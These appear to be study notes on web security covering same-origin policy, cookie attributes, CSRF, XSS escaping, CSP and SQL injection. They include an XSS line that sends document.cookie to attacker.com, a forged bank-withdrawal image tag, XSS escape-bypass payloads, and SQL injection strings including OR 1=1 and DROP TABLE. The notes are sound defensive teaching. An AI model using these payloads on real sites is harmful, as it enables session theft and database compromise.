# Web Security

## Same Origin Policy

Two pages from different sources should not be allowed to interface with each other! This is the fundamental security model of the web. The browser is analogous to an OS kernel, an origin is analogous to an OS process, so site rely on the browser to enfoce all the system security rules.

### Definition
The origin means `protocal-host-port` tuple, this can be described as:
```python
def isSameOrigin(url1, url2):
    return url1.protocol == url2.protocal and url1.hostname == url2.hostname and url1.port == url2.port
```

If two sites do not comply with same origin policy, they can't:

  - Read each other's Cookie,LocalStorage,IndexdDB
  - Get each other's DOM
  - Send to each other AJAX request

But they can embed static resources from another origin, like Images,Scripts,Styles.

Sometimes policy is too narrow, it's difficult to get `login.stanford.edu` and `axess.stanford.edu` to exchange data; but sometimes it's too broad, there is no way to isolate `https://web.stanford.edu/class/cs106a/` and `https://web.stanford.edu/class/cs253/`. We need a way around Same Origin Policy to allow two different origins to communicate.

### Cookie
If two sites have a top-level domain, different sub domain, e.g.`login.stanford.edu` and `axess.stanford.edu`, then they can define:
```js
document.domain = 'stanford.edu';
document.cookie = "userid=test1";
```
and the axess site can read the cookie. More examples:

|Originating URL|document.domain|Accessed URL|document.domain|Allowed|
|----|:----:|----|:----:|:----:|
|http://www.a.com/|a.com|http://pay.a.com/|a.com|YES|
|http://www.a.com/|a.com|https://pay.a.com/|a.com|NO|
|http://pay.a.com/|a.com|http://a.com/|(not set)|NO|
|http://www.a.com/|(not set)|http://www.a.com/|a.com|NO|

Another way to do this is to use server response:
```
Set-Cookie: userid=test1; domain=.stanford.edu; path=/
```
Both resolution can't resolve the `attack.stanford.edu` access content from `axess.stanford.edu`, so it's bad!

### iframe
If two sites not match Same Origin Policy, they can't get each other's DOM. For example, when you use `iframe` or `window.open` to open a new child window, they can not communicate with the parent window. 
```js
document.getElementById("myIFrame").contentWindow.document
// Uncaught DOMException: Blocked a frame from accessing a cross-origin frame.
```
There are 3 ways to resolve this situation.

**fragment identifier**

For a url `http://example.com/x.html#fragment`, the content after `#` is fragment, when you change the fragment, the page does not refresh.

So the parent window can write data to child window's fragment like this:
```js
var src = originURL + '#' + data;
document.getElementById('myIFrame').src = src;
```
Then the child window can monitor an event named `hashchange` to get the notice:
```js
window.onhashchange = checkMessage;
function checkMessage() {
  var message = window.location.hash;
  // ...
```
The child window also can change parent window's fragment:
```js
parent.location.href= target + "#" + hash;
```

**window.name**

Each browser window has a `window.name` property, this property has a quality, even if the page jump to a new location, the `window.name` will still be retained.

For example, the `http://parent.com/a.html` has a iframe src to `http://child.com`. When the child page loaded it can set it's `window.name=data`, and then use `location.href='http://parent.com/empty'`to redirect the same origin page as parent. Now the parent can get the data simple use `$('iframe').contentWindow.name`.

This property can exchange serveral MB data once, but monitor the child window name change is a performance loss.

**window.postMessage**

The above methods are hack method, the `window.postMessage` is a new cross-document messaging API design to resolve this situation. It can be used for complicated objects, handle cycles, read/write localstorage etc.

For example, when the parent window want to send a message to child:
```js
var popup = window.open('http://child.com', 'title');
popup.postMessage('Hello World!', 'http://child.com');
```
The first parameter of `postMessage` method is data, the second is origin(`protocal-host-port` tuple), also can use `*` represent all window.  

The child also can send message to parent:
```js
window.opener.postMessage('Nice to see you', 'http://parent.com');
```

They both can monitor message use a `message` event:
```js
window.addEventListener('message', function(event) {
  console.log(event.data);
},false);
```

`event` object has 3 property, `event.data` is the content of this message, `event.source` means which window send this message, `event.origin` means which origin send this message. So you can filter the message which not send to you and send back directly which send to you.
```js
window.addEventListener('message', receiveMessage);
function receiveMessage(event) {
  if (event.origin !== 'http://parent.com') return;
  if (event.data === 'Hello World') {
      event.source.postMessage('Hello back', event.origin);
  } else {
    console.log(event.data);
  }
}
```

### AJAX

## Session Attack

### Session and Cookie
The Http protocol is statusless, we need the server keeps a set of data related to a user's current browsing session, like Logins,Shopping carts,User tracking etc.The most common way is Cookies. Session desired these properties:

 - Browser remember user(so user doesn't need to repeatedly log in)
 - User cannot modify session cookie to login as another user
 - Session cookies are not valid forever
 - Session can be deleted on the server-side
 - Session should expire after some time, e.g. 30 days

When the server Set-Cookie, cookie have some basic attributes:

 - Expires, Specifies expiration date. If no date, then lasts for "browser session". If set to `Thu, 01 Jan 1970 00:00:00 GMT` will delete this cookie name and its value
 - Path, Scope the "Cookie" header to a particular request path prefix, e.g. `Path=/docs` will match `/docs` and `/docs/web`
 - Domain, Allows the cookie to be scoped to a "broader domain"(within the same registrable domain), e.g. `sub.a.com` can set cookies for `a.com`

The Cookies setting don't obey Same Origin Policy, because cookies were created before Same Origin Policy, they have different security model. Sometimes Cookies are more restrictive than Same Origin Policy, like `Path` partions cookies by path, but is ineffective, because pages on same origin can access each other's DOMs, run code in each other's contexts;The other time Cookies are less restrictive than Same Origin Policy, like Pages with same hostname can share the cookies, the protocol and port are ignored, and different origins(e.g. subdomain) can mess with each others cookies.

### Session hijacking

#### Over Http steal cookie
Sending cookies over unencrypted HTTP is a very bad idea.If anyone sees the cookie, they can use it to hijack the user's session, attacker sends victim's cookie as if it was their own, server will be fooled.  

How to mitigation this session hijacking, use the `Set-Cookie: key=value; Secure` cookie attribute will prevent cookie from being sent over unencrypted HTTP connections. An even better solution is use https for entire website.

#### XSS steal cookie
XSS is Cross Site Scripting. What if attacker can insert their code into the webpage? At this point, they can easily exfiltrate the user's cookie. `new Image().src='http://attacker.com/steal?cookie=' + document.cookie`.

The `HttpOnly` cookie attribute can prevent cookie from being read from JavaScript, use `Set-Cookie: key=value; Secure; HttpOnly`.

### CSRF
Consider this HTML embedded in attacker.com:
```html
<h1>Welcome to your account!</h1>
<img src='https://bank.com/avatar.png' />
```
The browser helpfully includes bank.com cookies in all requests to bank.com, even though the request originated from attacker.com, attacker.com can embed user's real avatar from bank.com. What if the embedded HTML is `<img src='https://bank.com/withdraw?from=bob&to=mallory&amount=1000'>`. Attack which forces an end user to execute unwanted actions on a web app in which they're currently authenticated, effective even when attacker can't read the HTTP response. This kind of hijacking is called Cross-Site Request Forgery(CSRF).

How to mitigate CSRF?

The answer is use SameSite cookie attributes, this will prevent cookie from being sent with requests initiated by other sites.  

 - SameSite=None - default, always send cookies
 - SameSite=Lax - withhold cookies on subresource requests originating from other sites, allow them on top-level requests
 - SameSite=Strict - only send cookies if the request originates from the website that set the cookie

This table discribe when the request send to another site, different SameSite attribute send cookie or not:

|Request type|Request example|None|Lax|Strict|
|:----:|----|:----:|:----:|:----:|
|Link|`<a href="..."></a>`|Send|Send|Not|
|Preload|`<link rel="prerender" href="..."/>`|Send|Send|Not|
|Form Get|`<form method="GET" action="...">`|Send|Send|Not|
|Form Post|`<form method="POST" action="...">`|Send|Not|Not|
|iframe|`<iframe src="..."></iframe>`|Send|Not|Not|
|AJAX|`$.get("...")`|Send|Not|Not|
|Image|`<img src="...">`|Send|Not|Not|

### Summary
 - Never trust data from the client
 - Don't use broken cookie Path attribute for security
 - Use SameSite=Lax to protect against CSRF attacks
 - If you remember one thing: set your cookie like this:
```
Set-Cookie: key=value; Secure; HttpOnly; Path=/;
SameSite=Lax; Expires=Fri, 1 Nov 2021 00:00:00 GMT
(Expires should be set to 30days later)
```

## XSS

XSS(cross site scripting) is a code injection vulnerablity, it's caused when untrusted user data unexpected becomes code. The unexpected code is JavaScript in an HTML document. If successful, attacker gains the ablility to do anything the target can do through their browser, like view/exfiltrate their cookies, send any HTTP request to the site with the user's cookies!

XSS is prevalent, the web has so many different languages, data can be used in many different contexts! Even within HTML, there are at least 5 contexts to understand. And each context has different "control characters". If you slip up in even one place, you're completely vulnerable!

### Attack Type

Usually there are two types attack, reflected XSS attack and stored XSS attack.

In reflected XSS, the attack code is placed into the HTTP request itself, the attacker goal is to find a URL that can make target visit, URL includes attack code. So the limitation is attack code must be added to the URL path or query parameters.

In stored XSS, the attack code is persisted into the database, the attacker goal is to use any means to get attack code into the database. Once there, server includes it in all pages sent to clients.

If the server code is:
```js
app.get('/', (req, res) => {
  const { source } = req.query
  res.send(`
    <h1>
    ${source ? `Hi ${source} reader!` : ''}
    Login to your bank account:
    </h1>
  `)
})
```

The attack url can be:  
`http://localhost:4000/?source=%3Cscript%3Ealert(%27hey%20there!%27)%3C/script%3E`

This is a typical reflected XSS, the server does not stored attack code into database, attacker need to send url to goal.

### Attack Example

#### HTML elements
```html title="HTML template"
<p>Search result for USER_DATA_HERE</p>
```
```html title="Resulting page(no escape)"
<p>Search result for <script>alert(document.cookie)</script></p>
```
what is the fix?  

 - change all `<` to `&lt;`
 - change all `&` to `&amp;`

#### HTML attributes
```html title="HTML template"
<img src='avatar.png' alt='USER_DATA_HERE' />
```
```html title="Resulting page(no escape)"
<img src='avatar.png' alt='Feross' onload='alert(document.cookie)' />
```
what is the fix?  

 - change all `'` to `&apos;`
 - change all `"` to `&quot;`
 - change all `&` to `&amp;`

what about set html attributes without quotes?
```html title="HTML template"
<img src='avatar.png' alt=USER_DATA_HERE />
```
```html title="Resulting page(escaping ' and double quotes and &)"
<img src=avatar.png alt=Feross onload=alert(document.cookie) />
```
It's a bad idea! Should always quotes attributes!

```html title="HTML template"
<div onmouseover='handleHover(USER_DATA_HERE)'>
```
```html title="Resulting page(escaping ' and double quotes)"
<div onmouseover='handleHover(); alert(document.cookie)'>
```

what is the fix? escape one more char `;`

For most attributes, escaping attributes is sufficient. But certain attributes like `src`,`href`,`data:`,`javascript:` can never be safe, even if you escape the attribute value!

#### Script elements
```js title="HTML template"
<script>
  let username = 'USER_DATA_HERE'
  alert(`Hi there, ${username}`)
</script>
```
```js title="Resulting page(no escape)"
<script>
  let username = 'Feross'; alert(document.cookie); //'
  alert(`Hi there, ${username}`)
</script>
```
If we just change all `'` to `\'` , `"` to `\"`, it still work!  
The user input can be `Feross\'; alert(document.cookie) //` .

If we change one more `\` to `\\`, it still broken!  
The user input can be `</script><script>alert(document.cookie)</script><script>`.

what is the fix?

 - Hex encode user data to produce a string with characters 0-9, A-F.
 - Include it inside a JavaScript string
 - Then, decode the hex string

```js
<script>
  let username = hexDecode('HEX_ENCODED_USER_DATA')
  alert(`Hi there, ${username}`)
</script>
```

Now if the user still input `</script><script>alert(document.cookie)</script><script>`, the result will be `hexDecode('3c2f736372697074...')`. It works!

Another solution is use a `<template>` tag to store data that won't visibly render, then the escaping rules are simple and the same as for HTML elements, just HTML encode `<` and `&` characters.

```html
<template id='username'>HTML_ENCODED_USER_DATA</template>
<script>
  let username = document.getElementById('username').textContent
  alert(`Hi there, ${username}`)
</script>
```

#### Never safe context

There are some context never safe, we should avoid!
```html
<script>USER_DATA_HERE</script>

<!-- USER_DATA_HERE -->

<USER_DATA_HERE href='/'>Link</USER_DATA_HERE>

<div USER_DATA_HERE='some value'></div>

<style>USER_DATA_HERE</style>
```

### XSS defenses
The code injection is caused when untrusted user data unexpectedly becomes code. So we need to escape or sanitize user input before combing it with code(the HTML template).

**where untrusted data comes from**

- HTTP request from user, like query parameters, form fields, headers, cookies, file uploads
- Data from a database. When you works in a large team, who knows how the data got into the database?
- Third-party services. We don't know it's safe, maybe the service gets hacked and sending unsafe data

**when to escape**

On the way into the database or on the way out at render time? We should always on the way out at render time.

Because even if you are sure that you control all possible ways for data to get into the database, you don't know in advance what context the data will appear in. Different contexts have different control characters.

**how to escape**

Use your framework's built-in HTML escaping functionality, if bugs are found, you will get the fix for free! Also, make sure you know the contexts where it is safe to use the output.

### CSP
The Same Origin Policy is to prevent some other sites making certain requests to our site. CSP is inverse, it prevent our site from make requests to other sites.

CSP is an added layer of security against XSS, even if attacker code is running on user's browser in our site's context, we can limit the damage they can do.

CSP blocks HTTP requests which would violate the policy. Add the Content-Security-Policy header to an HTTP response to control the resources the page is allowed to load.

#### Using CSP
The snippet below shows a CSP response heeader with a minimal policy configuration:

```http
Content-Security-Policy: script-src 'self'
```

The server includes this header on the response that sends an HTML page to the browser. The policy configuration tells the browser that ths page can only execute scripts coming from its own origin.This means that if the application is running on `https://example.com/app`, the browser only executes remote JavaScript code comming from `https://example.com`, anyting else is blocked, include `*.example.com`.

For example:
```html
<!-- Not allowed! Inline scripts are prevented -->
<img src="none.png" onerror="evilCode()">
<!-- Not allowed! Inline scripts are prevented  -->
<script>evilCode()</script>
<!-- Not allowed! Remote script comes from a different origin  -->
<script src="https://evil.com/code.js"></script>
<!-- Allowed! Relative URLs are loaded from the same origin -->
<script src="/code.js"></script>
```

#### Directives and Values
The CSP syntax is:
```http
Content-Security-Policy: <policy-directive>; <policy-directive>
```
Where `<policy-directive>` consists of: `<directive> <value> <value2>` with no internal punctuation. 

The CSP fetch directives control the locaions from which certain resource types may be loaded. Some commonly used directives are as follows:

 - default-src, Serves as a fallback for other fetch directives
 - connect-src, Restricts sources from "script interfaces": fetch, XHR, WebSocket, `<a ping>` etc.
 - frame-src, Restricts sources for nested browsing contexts: `<frame>`, `<iframe>`
 - img-src, Restricts sources for images, favicons
 - script-src, Restricts sources for `<script>` elements
 - style-src, Restricts sources for `<style>` and `<link rel='stylesheet'>` elements
 - media-src, Restricts sources for media: `<audio>`, `<video>`, `<track>`

There are also some directives do not inherit from `defalut-src`, include `base-uri`, `form-action`, `frame-ancestors`, `navigate-to`, `upgrade-insecure-requests`.

An overview of the allowed values are listed below:

 - none, Won't allow loading of any resources
 - self, Only allow resources from the current origin
 - unsafe-inline, Allow use of inline resources
 - Host, Only allow loading of resources from a specific host, also can add the path part. e.g. `*.a.com`, `b.com/c/`
 - Scheme, Only allow loading resources over a specific scheme. e.g. `http:`, `https:`, `data:`

#### CSP Level 2

Unsurprisingly, such a CSP policy is wildly incompatible with many applications. Even today, we often rely on inline code blocks to load JavaScript code into application. CSP Level 2 aims to make CSP more compatible with real-world applications without compromising security. It introduces two mechanims: hashes and nonces.

```html
<button id="hello">Say Hello!</button>
<script>
document.addEventListener("DOMContentLoaded", () => {
  document.getElementById("hello")
      .addEventListener("click", () => { alert("Hello!")});
})
</script>
```
For this simplified example, if we use hashes mechanims, we need to calculates the hash of the script block and add it to the CSP policy.
```http
Content-Security-Policy: script-src 'sha256-6X6+1K/DKkKDJXeIXoOfaIX+FzybN9LaGtutkR5DWpQ='
```
If you change any charactor of the script, the hashes will need to update. So typically we do not calculate these hashes manually.If you load application in a Chromium-based browser, you can find the expected hash in the error messages of the developer console, as shown below:
```
Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self'".
Either the 'unsafe-inline' keyword, a hash ('sha256-6X6+1K/DKkKDJXeIXoOfaIX+FzybN9LaGtutkR5DWpQ='), or a nonce ('nonce-...') is required to enable inline execution.
```

The nonces mechanims need you configured both script block and CSP policy with a nonce attribute and with same value.
```
Content-Security-Policy: script-src 'nonce-1f40e4a23493'
```
It supports both inline codes and remote code files.
```html
<script src="https://analytics.example.com/1.js" nonce="1f40e4a23493"></script>
```
Nonces should be generated from a cryptographically secure random source and should never be re-used. Otherwise, an attacker can predict the nonce and include a valid nonce on injected code blocks.

#### strict-dynamic
The CSP above has an issue, which is many real-world CSP policies contain patterns that allow an attacker to bypass the policy. [This famous paper](https://research.google/pubs/pub45542/){:target="_blank"} descripe how to bypass the policy. The paper recommends abandoning URL-based policies in favor of hash-based and nonce-based policies.

To make this work, we need a mechanism to enable cascading JavaScript loading. So, the `strict-dynamic` comes. If we set this keyword to our CSP policy, it tells the browser: If you encouter a script that was loaded with a hash or a nonce, you can allow that script to load remote code dependencies by inserting additional script elements into the page. 

Since `strict-dynamic` was introduced to counter URL-based bypass attacks, it is incompatible with URLs. `strict-dynamic` only allow scripts that have been approved with a nonce or a hash to load additional resources. In fact, when a browser encounters `strict-dynamic`, it will automatically ignore URL-based expressions.

#### Universal CSP Policy
How you build a policy depends a bit on your specific situation. But we can refer to Google's policy, which offers effective protection against XSS vulnerablities without potentially breaking any of their applications. The snippet is formatted for readablity:

```http
Content-Security-Policy: 
  script-src 'report-sample' 'nonce-3YCIqzKGd5cxaIoTibrW/A' 'unsafe-inline'
             'strict-dynamic' https: http: 'unsafe-eval';
  object-src 'none';
  base-uri 'self';
  report-uri /webchat/_/cspreport
```

A modern browser see this policy, will recognizes the nonce which causes the `unsafe-inline` keyword to be ignored. It will also recognizes `strict-dynamic`, which causes any URL-based expressions(i.e., `http: https:`) to be ignored.

The legacy browsers that only support CSP Level 2, or even Level 1 , will see a different policy which will ignore `strict-dynamic` or `nonces`. Maybe cause some XSS attack, but the application is still work well.

## SQL Injection
The SQL injection's goal is execute arbitrary queries to the database via a vulnerable application.Read sensitive data from the database, modify database data, execute administration operations on the database, and sometimes issue commands to the operating system.

This kind of attack is possible when an application combines unsafe user supplied data(like forms, cookies, HTTP headers, etc.) with a SQL query "template".

### Attack Example

#### Common example
Think about this vulnerable code:
```js
const { username, password } = req.body
const query = `SELECT * FROM users WHERE username = "${username}"`
const results = db.all(query)
if (results.length > 0) {
  // user exists!
  const user = results[0]
  if (user.password === password) {
  // success
  }
}
```
The expected input is `{username: 'larry'}`, but malicious input is `{username: '" OR 1=1 --'}`. The `--` is a SQL comment, will comment any sql statement after it, and the `1=1` will always be true.
So the result is:
```js
const { username, password } = req.body
 // { username: '" OR 1=1 --', password: '...' }
const query = `SELECT * FROM users WHERE username = "${username}"`
 // SELECT * FROM users WHERE username = "" OR 1=1 --"
const results = db.all(query)
 // all rows in the users table!
if (results.length > 0) {
 // will always be true!
}
```
The attacker will get all the user table data. How about the malicious input `{username: '";drop table users --'}`?

#### Blind SQL injection
When the database does not output data to the web page, an attacker is forced to steal data by asking the database a series of true or false questions. The web app may be configured to show generic error messages instead of printing useful data to the user, but still vulnerable to SQL injection.

There are two kinds of blind SQL injection. One is Content-based, if the page responds differently depending on if the query matches something or not, attacker can use this to ask "yes or no" questions.The other is Time-based, make the database pause for a specified amount of time when the query matches something, otherwise return immediately, different timings are observable by attacker.

Let's take a look at Time-based sql injection. We can use a slow SQL expression, like `SELECT 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))`. Then use a SQL if-statement(CASE) to run the slow expression only when the answer to our question is `true`, like `SELECT CASE expression WHEN cond THEN slow ELSE speedy END`. Then we change the username or other things in the cond to get what is key information.

### Defenses